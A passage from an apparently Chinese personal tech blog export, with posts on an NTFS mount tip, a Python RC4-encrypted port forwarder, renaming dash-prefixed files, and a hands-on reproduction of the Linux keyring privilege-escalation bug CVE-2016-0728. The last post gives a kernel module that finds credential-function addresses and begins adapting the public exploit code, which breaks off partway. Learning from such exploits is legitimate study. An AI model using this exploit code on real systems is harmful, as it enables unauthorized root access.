class="string">&quot;--unregister&quot;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        UnregisterAddin(OutlookAddin)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        RegisterAddin(OutlookAddin)</span><br></pre></td></tr></table></figure>
<p>另，outlookspy对查看com对象很有帮助。</p>
<p>许久不用md生疏了   O_o</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>osx读写ntfs</title>
    <url>/2016/01/24/2016-01-24/</url>
    <content><![CDATA[<p>作为国际大厂，苹果故意不支持巨硬家的ntfs文件系统未免有点小心眼。<br>升了el capitan后希捷自家的ntfs支持软件不能用了，只好寻求其他写入ntfs的方式。<br>google一番找到了个不算优雅但还凑合的方案，在此记录一下。</p>
<p>接入ntfs移动硬盘root shell编辑&#x2F;etc&#x2F;fstab内容<br>如：<br>LABEL&#x3D;DRIVE_NAME none ntfs rw,auto,nobrowse<br>其中DRIVE_NAME是连入设备的卷标，注意若卷标含空格则使用“\ ”转义符。<br>此时重连设备可在&#x2F;Volumes下看到卷。<br>这种方法无法在GUI环境读写磁盘文件，但是能在终端下操作，只能说凑合能用。。。</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>python asyncore实现端口转发</title>
    <url>/2015/10/01/2015-10-01/</url>
    <content><![CDATA[<p>最近Digital Ocean的VPS直连一直连不上，怀疑是功夫王根据ssh的流量特征做了拦截，遂写了个脚本实现RC4加密的端口转发(主要目的是规避流量特征的分析)。<br>python的asyncore库是一个异步的socket通信库。<br>一个简单的使用示例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncore, socket</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HTTPClient</span>(asyncore.dispatcher):              <span class="comment"># 继承dispatcher类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, path</span>):</span><br><span class="line">        asyncore.dispatcher.__init__(<span class="variable language_">self</span>)</span><br><span class="line">                                                    <span class="comment"># 这个示例是client端</span></span><br><span class="line">        <span class="variable language_">self</span>.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.connect( (host, <span class="number">80</span>) )</span><br><span class="line">        <span class="variable language_">self</span>.buffer = <span class="string">&#x27;GET %s HTTP/1.0\r\n\r\n&#x27;</span> % path</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_connect</span>(<span class="params">self</span>):                       <span class="comment"># 此成员在连接成功时被调用</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_close</span>(<span class="params">self</span>):                         <span class="comment"># 远程关闭时被调用</span></span><br><span class="line">        <span class="variable language_">self</span>.close()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_read</span>(<span class="params">self</span>):                          <span class="comment"># 默认情况下loop会循环调用此函数，可自定义readable成员实现条件控制</span></span><br><span class="line">        <span class="built_in">print</span> <span class="variable language_">self</span>.recv(<span class="number">8192</span>)                       <span class="comment"># 应该会阻塞在这</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writable</span>(<span class="params">self</span>):                             <span class="comment"># 可发送的条件控制成员</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>(<span class="variable language_">self</span>.buffer) &gt; <span class="number">0</span>)               <span class="comment"># 当发送队列不为空时</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_write</span>(<span class="params">self</span>):                         <span class="comment"># 发送操作调用的回调</span></span><br><span class="line">        sent = <span class="variable language_">self</span>.send(<span class="variable language_">self</span>.buffer)</span><br><span class="line">        <span class="variable language_">self</span>.buffer = <span class="variable language_">self</span>.buffer[sent:]</span><br><span class="line">client = HTTPClient(<span class="string">&#x27;www.python.org&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">asyncore.loop()                                     <span class="comment"># 此调用会在asyncore内部开始异步通信</span></span><br></pre></td></tr></table></figure>
<p>dispatcher父类中handle开头的成员都是回调类，可在子类中定义回调函数。</p>
<p>在网上查了一些类似的程序都感觉代码写的不是很好，于是自己查了下manual重新造了遍轮子，发现还是挺别扭😂<br>大致代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket,asyncore,sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line">DEBUG=<span class="literal">False</span></span><br><span class="line">cipher_rc4_obj=<span class="literal">None</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Transmiter</span>(asyncore.dispatcher):                  <span class="comment">#数据交换类</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;数据交换类,两个此类的实例可互换tx和rx,若初始化socket则表示server,否则是client&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,socket_info,transmitee=<span class="literal">None</span></span>):     </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;参数为socket_info,另一个交换实例&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;(作为client时socket_info为tuple(ip,port)，作为server时socket_info为accept得到的socket)&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;例如Transmiter((12.34.56.78,8080),transee)实例化了一个client端&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;Transmiter(socket_acptd,transee)实例化了一个server端&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.buf_Tx=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.buf_Rx=<span class="string">&#x27;&#x27;</span>                                              <span class="comment"># Reserved</span></span><br><span class="line">        <span class="variable language_">self</span>.transmitee=transmitee                                  <span class="comment"># transmitee是要与之交换数据的另一个对象</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=transmitee <span class="keyword">and</span> <span class="literal">None</span>==transmitee.transmitee:</span><br><span class="line">            transmitee.transmitee=<span class="variable language_">self</span>                              <span class="comment"># transmitee与本实例交换数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(socket_info,socket.socket):                   <span class="comment"># server</span></span><br><span class="line">            asyncore.dispatcher.__init__(<span class="variable language_">self</span>,socket_info)</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer server&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(socket_info[<span class="number">0</span>],<span class="built_in">str</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(socket_info[<span class="number">1</span>],<span class="built_in">int</span>):</span><br><span class="line">            asyncore.dispatcher.__init__(<span class="variable language_">self</span>)                      <span class="comment"># client</span></span><br><span class="line">            <span class="variable language_">self</span>.create_socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># 建立套接字</span></span><br><span class="line">            <span class="variable language_">self</span>.connect(socket_info)                               <span class="comment"># (ip,port)</span></span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer client&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_read</span>(<span class="params">self</span>):                  <span class="comment"># 读处理:recv并加入transee的发送队列或丢弃数据</span></span><br><span class="line">        read = <span class="variable language_">self</span>.recv(<span class="number">4096</span>)              <span class="comment"># 有数据可读时将读取的数据加入transee的发送队列，无transee则丢弃</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Read\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=<span class="variable language_">self</span>.transmitee:</span><br><span class="line">            <span class="variable language_">self</span>.transmitee.buf_Tx += read</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Drop\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writable</span>(<span class="params">self</span>):                     <span class="comment"># 可写判断:检测self的发送队列是否有数据</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>(<span class="variable language_">self</span>.buf_Tx) &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_write</span>(<span class="params">self</span>):                 <span class="comment"># 写处理:send发送队列，保留未发送成功的部分</span></span><br><span class="line">        sent = <span class="variable language_">self</span>.send(<span class="variable language_">self</span>.buf_Tx)</span><br><span class="line">        <span class="variable language_">self</span>.buf_Tx = <span class="variable language_">self</span>.buf_Tx[sent:]</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Write\t%d bytes&#x27;</span> % (sent)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_close</span>(<span class="params">self</span>):                 <span class="comment"># 关闭状态处理，关闭self及transee</span></span><br><span class="line">        <span class="variable language_">self</span>.close()                        <span class="comment"># 远端关闭后关闭连接</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer close&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=<span class="variable language_">self</span>.transmitee:</span><br><span class="line">            <span class="variable language_">self</span>.transmitee.close()</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer\&#x27;s transee close&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_error</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer error occur&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.handle_close()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_expt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer exception occur&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.handle_close()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Connector</span>(<span class="title class_ inherited__">object</span>):        <span class="comment"># 如果断开不太好重新建立连接</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,remoteaddr1,remoteaddr2</span>):</span><br><span class="line">        <span class="variable language_">self</span>.remoteaddr1=remoteaddr1</span><br><span class="line">        <span class="variable language_">self</span>.remoteaddr2=remoteaddr2</span><br><span class="line">        <span class="variable language_">self</span>.trans1=Transmiter(remoteaddr1)</span><br><span class="line">        <span class="variable language_">self</span>.trans2=Transmiter(remoteaddr2,<span class="variable language_">self</span>.trans1)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Listener</span>(asyncore.dispatcher):        <span class="comment"># 两个accepted组成一对trans</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,localaddr,backlog=<span class="number">5</span></span>):</span><br><span class="line">        asyncore.dispatcher.__init__(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.lasttrans=<span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.create_socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.set_reuse_addr()</span><br><span class="line">        <span class="variable language_">self</span>.bind(localaddr)</span><br><span class="line">        <span class="variable language_">self</span>.listen(backlog)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_accept</span>(<span class="params">self</span>):</span><br><span class="line">        conn, addr = <span class="variable language_">self</span>.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;accepted %s&#x27;</span> % <span class="built_in">str</span>(addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>==<span class="variable language_">self</span>.lasttrans:                <span class="comment">#没有上一个trans</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;wait for another&#x27;</span></span><br><span class="line">            <span class="variable language_">self</span>.lasttrans=Transmiter(conn)     <span class="comment">#记录此trans</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;paired to last one&#x27;</span></span><br><span class="line">            Transmiter(conn,<span class="variable language_">self</span>.lasttrans)     <span class="comment">#有记录的trans,配对</span></span><br><span class="line">            <span class="variable language_">self</span>.lasttrans=<span class="literal">None</span>                 <span class="comment">#清除记录</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Forwarder</span>(asyncore.dispatcher):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, localaddr, remoteaddr, backlog=<span class="number">5</span></span>):</span><br><span class="line">        asyncore.dispatcher.__init__(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.remoteaddr=remoteaddr</span><br><span class="line">        <span class="variable language_">self</span>.create_socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.set_reuse_addr()</span><br><span class="line">        <span class="variable language_">self</span>.bind(localaddr)</span><br><span class="line">        <span class="variable language_">self</span>.listen(backlog)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_accept</span>(<span class="params">self</span>):</span><br><span class="line">        conn, addr = <span class="variable language_">self</span>.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Forward from %s to %s&#x27;</span> % (<span class="built_in">str</span>(addr),<span class="variable language_">self</span>.remoteaddr)</span><br><span class="line">        trans_Acptd=Transmiter(conn)</span><br><span class="line">        trans_toRemote=Transmiter(<span class="variable language_">self</span>.remoteaddr,trans_Acptd)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransmiterWithCipher</span>(<span class="title class_ inherited__">Transmiter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,socket_info,cipher_obj=<span class="literal">None</span>,isEnc=<span class="literal">False</span>,transmitee=<span class="literal">None</span></span>):</span><br><span class="line">        Transmiter.__init__(<span class="variable language_">self</span>,socket_info,transmitee)</span><br><span class="line">        <span class="variable language_">self</span>.cipher_obj=cipher_obj</span><br><span class="line">        <span class="variable language_">self</span>.isEnc=isEnc</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_read</span>(<span class="params">self</span>):</span><br><span class="line">        read = <span class="variable language_">self</span>.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Read\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=<span class="variable language_">self</span>.cipher_obj <span class="keyword">and</span> <span class="literal">False</span>!=<span class="variable language_">self</span>.isEnc:</span><br><span class="line">            read=<span class="variable language_">self</span>.cipher_obj.decrypt(read)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=<span class="variable language_">self</span>.transmitee:</span><br><span class="line">            <span class="keyword">if</span> <span class="literal">None</span> != <span class="variable language_">self</span>.transmitee.cipher_obj <span class="keyword">and</span> <span class="literal">False</span>!=<span class="variable language_">self</span>.transmitee.isEnc:</span><br><span class="line">                read = <span class="variable language_">self</span>.transmitee.cipher_obj.encrypt(read)</span><br><span class="line">            <span class="variable language_">self</span>.transmitee.buf_Tx +=read</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Drop\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForwarderWithCipher</span>(<span class="title class_ inherited__">Forwarder</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, localaddr, remoteaddr, cipher_obj=<span class="literal">None</span>,localenc=<span class="literal">False</span>,remoteenc=<span class="literal">False</span>,backlog=<span class="number">5</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.cipher_obj=cipher_obj</span><br><span class="line">        <span class="variable language_">self</span>.localenc=localenc</span><br><span class="line">        <span class="variable language_">self</span>.remoteenc=remoteenc</span><br><span class="line">        Forwarder.__init__(<span class="variable language_">self</span>, localaddr, remoteaddr, backlog)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_accept</span>(<span class="params">self</span>):</span><br><span class="line">        conn, addr = <span class="variable language_">self</span>.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Forward from %s to %s&#x27;</span> % (<span class="built_in">str</span>(addr),<span class="variable language_">self</span>.remoteaddr)</span><br><span class="line">        trans_Acptd=TransmiterWithCipher(conn,<span class="variable language_">self</span>.cipher_obj,<span class="variable language_">self</span>.localenc)</span><br><span class="line">        trans_toRemote=TransmiterWithCipher(<span class="variable language_">self</span>.remoteaddr,<span class="variable language_">self</span>.cipher_obj,<span class="variable language_">self</span>.remoteenc,trans_Acptd)</span><br></pre></td></tr></table></figure>
<p>由于是规避流量特征所以拿rc4凑合一下，根据自己的脑洞顺手写了个Connector和Listenner没有测试，拒绝填坑。最后通过其他连接渠道把脚本部到vps后发现直连还是会reset，估计是校长并没有看流量特征直接把vps的C段都断了。 (￣へ￣)<br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2FzeW5jb3JlLmh0bWw=" title="https://docs.python.org/2/library/asyncore.html">ref<i class="fa fa-external-link"></i></span></p>
<p>发现了个小工具，socat，功能挺多。</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>对付以减号开头的文件</title>
    <url>/2015/07/22/2015-07-22/</url>
    <content><![CDATA[<p>linux下不小心把文件弄成  -sth  的文件名了。。。<br>上网查了查发现两种简单的方法：<br>eg:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span>  --  -sth  sth</span><br></pre></td></tr></table></figure>
<p>或者机智的用</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span>  ./-sth  sth</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title>看看CVE-2016-0728</title>
    <url>/2016/01/27/2016-01-27/</url>
    <content><![CDATA[<p>上周末看了下**<span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">cve-2016-0728<i class="fa fa-external-link"></i></span>** linux本地提权漏洞，今天记录一下。<br>这个漏洞主要是因为keyrings内核组件的引用泄露引起的。<br>此内核对象采用一个32位无符号整数做引用计数，但在引用计数溢出的时候没有进行合理的错误处理，所以当对此对象引用到达4G时会使引用计数回到0，内核在检测到此引用计数为0时会析构对象释放空间。而此时r3程序还保留有内核对象的引用，如此就形成了一个UAF漏洞。<br>印象中这种整形溢出造成的严重漏洞还真不少，本着实践出真知的态度实践一下。<br>**<span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">原文<i class="fa fa-external-link"></i></span>**中提到：<br>“Addresses of commit_creds and prepare_kernel_cred functions are static and can be determined per Linux kernel version&#x2F;android device.”<br>所以先写了个内核模块获取这俩函数的地址：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">find_symbol_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">find_symbol_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">//模块加载函数：</span></span><br><span class="line"><span class="type">int</span> __init <span class="title function_">find_symbol_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> * name1= <span class="string">&quot;prepare_kernel_cred&quot;</span>;	<span class="comment">//待查找的内核符号的名字</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> * name2= <span class="string">&quot;commit_creds&quot;</span>;		<span class="comment">//待查找的内核符号的名字</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> * <span class="title">ksymbol</span> ;</span>  		<span class="comment">// 用于接收测试函数返回值</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> * <span class="title">owner</span>;</span>            		<span class="comment">// 内核符号所属的模块</span></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> *crc;</span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name[<span class="number">2</span>]=&#123;name1,name2&#125;;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)&#123;</span><br><span class="line">		<span class="type">bool</span> gplok = <span class="literal">true</span>;                		<span class="comment">// 模块支持GPL 许可</span></span><br><span class="line">		<span class="type">bool</span> warn = <span class="literal">true</span>;                 		<span class="comment">// 允许输出警告信息</span></span><br><span class="line">		ksymbol = find_symbol(*(name+i),&amp;owner,&amp;crc,gplok,warn);     <span class="comment">//调用待测试函数</span></span><br><span class="line">		<span class="keyword">if</span>( ksymbol != <span class="literal">NULL</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*输出查找到的内核符号在内存中的地址*/</span></span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt;ksymbol-&gt;value : %lx\n&quot;</span>,ksymbol-&gt;value);</span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt;ksymbol-&gt;name : %s\n&quot;</span>,ksymbol-&gt;name);   <span class="comment">//输出内核符号名字</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt;Failed to find symbol %s\n&quot;</span>, *(name+i));</span><br><span class="line">		<span class="keyword">if</span>( owner != <span class="literal">NULL</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*输出内核符号所属的模块的名字*/</span></span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt; owner-&gt;name : %s\n&quot;</span>,owner-&gt;name);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>( crc != <span class="literal">NULL</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*  输出内核符号的crc 值所在的地址*/</span></span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt;*crc : %lx\n&quot;</span>,*crc);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//模块退出函数：</span></span><br><span class="line"><span class="type">void</span> __exit <span class="title function_">find_symbol_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;&lt;0&gt;module exit ok!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//模块加载、退出函数调用：</span></span><br><span class="line">module_init(find_symbol_init);</span><br><span class="line">module_exit(find_symbol_exit);</span><br></pre></td></tr></table></figure>
<p>Google了一番将其编译成ko文件，再</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加载</span></span><br><span class="line">insmod find_symbol.ko</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载</span></span><br><span class="line">rmmod find_symbol</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看输出</span></span><br><span class="line">dmesg</span><br></pre></td></tr></table></figure>
<p>得到如下内容：</p>
<img src="/2016/01/27/2016-01-27/22.17.18.png" class="">
<p>根据获取到的两个函数地址修改**<span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">原文<i class="fa fa-external-link"></i></span>**中的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f */</span></span><br><span class="line"><span class="comment">/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */</span></span><br><span class="line"><span class="comment">/* $ ./cve_2016_072 PP_KEY */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="type">unsigned</span> <span class="type">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="type">unsigned</span> <span class="type">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff810957e0)	<span class="comment">//got from find_symbol	//(0xffffffff81094250)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81095ae0)	<span class="comment">//got from find_symbol	//(0xffffffff81094550)</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> * name;</span><br><span class="line">    <span class="type">size_t</span> datalen;</span><br><span class="line">    <span class="type">void</span> * vet_description;</span><br><span class="line">    <span class="type">void</span> * preparse;</span><br><span class="line">    <span class="type">void</span> * free_preparse;</span><br><span class="line">    <span class="type">void</span> * instantiate;</span><br><span class="line">    <span class="type">void</span> * update;</span><br><span class="line">    <span class="type">void</span> * match_preparse;</span><br><span class="line">    <span class="type">void</span> * match_free;</span><br><span class="line">    <span class="type">void</span> * revoke;</span><br><span class="line">    <span class="type">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">userspace_revoke</span><span class="params">(<span class="type">void</span> * key)</span> &#123;</span><br><span class="line">    